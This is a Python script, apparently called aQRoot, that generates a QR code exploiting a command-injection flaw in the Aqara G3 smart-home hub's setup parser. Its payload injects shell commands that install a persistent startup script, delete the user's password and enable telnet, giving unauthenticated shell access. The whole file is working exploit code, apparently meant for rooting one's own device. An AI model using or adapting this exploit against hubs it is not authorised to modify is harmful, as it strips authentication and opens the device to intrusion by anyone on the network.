#!/usr/bin/env python3
import argparse
import segno

__title__ = "aQRoot"
__desc__ = "Enable telnet via qrcode command injection for Aqara G3 hub"
__version__ = "0.2.0"
__author__ = "Gareth Bryan"
__license__ = "MIT"


def cipher(data):
    iArr = [[-128, -48, 33, 164], [-47, 32, 34, 84], [33, 35, -1, 0], [127, 127, 35, -91]]
    out = ""
    for c in data:
        for j in iArr:
            if j[0] > c or j[1] < c:
                continue
            out += (j[2] if j[2] != -1 else c) + j[3] + c
        out += chr(0xA2 - c)
    return out


def generate_payload(ssid, pwd, payload, post_init):
    """
    overall qrcode buffer is char[1024]
    nslookup sprintf buffer is char[132]
    Do not exceed these.
    "nslookup domain;<payload>0x00"
    """
    payload.insert(0, 'a')
    payload = {
        "b": "\\n".join(post_init),
        "d": ";".join(payload),
        "x": cipher(ssid.encode()),
        "y": cipher(pwd.encode()),
        "l": "en",
    }
    payload_string = "&".join([f"{k}={v}" for k, v in payload.items()])
    if len(payload['d']) > 121:
        raise ValueError(f"Payload (d) exceeds buffer {len(payload['d'])}/122")
    if len(payload_string) > 1023:
        raise ValueError(f"Payload string exceeds qrcode buffer {len(payload_string)}/1024")
    return payload_string


def gen_qrcode(data, outfile=None):
    qrcode = segno.make(data, error="h")
    qrcode.terminal(compact=True, border=10)
    if outfile:
        qrcode.save(outfile, border=10, scale=8)


def main(args):
    try:
        data = generate_payload(
            ssid=args.ssid,
            pwd=args.pwd,
            payload=[
                'x="fw_man"ager.sh',
                'y=/data/scripts/post_init.sh',
                '$x -t -f',
                'z=`agetprop persist.app.bind_key`',
                'echo -e $z>$y',
                'tail -n2 $y|sh'
            ],
            post_init = [
                '#\\x21/bin/sh',
                'fw_manager.sh -r',
                'passwd -d $USER',
                'fw_manager.sh -t -k'
            ],
        )
        gen_qrcode(data, args.filename)
    except ValueError as e:
        print(e)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="{} v{}\n{}".format(__title__, __version__, __desc__),
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument(
        "ssid",
        help="Wireless SSID",
    )
    parser.add_argument(
        "pwd",
        help="Wireless Password"
    )
    parser.add_argument(
        "filename",
        nargs="?",
        type=argparse.FileType("wb"),
        help="(Optional) Save QR Code as image",
    )
    args = parser.parse_args()
    main(args)
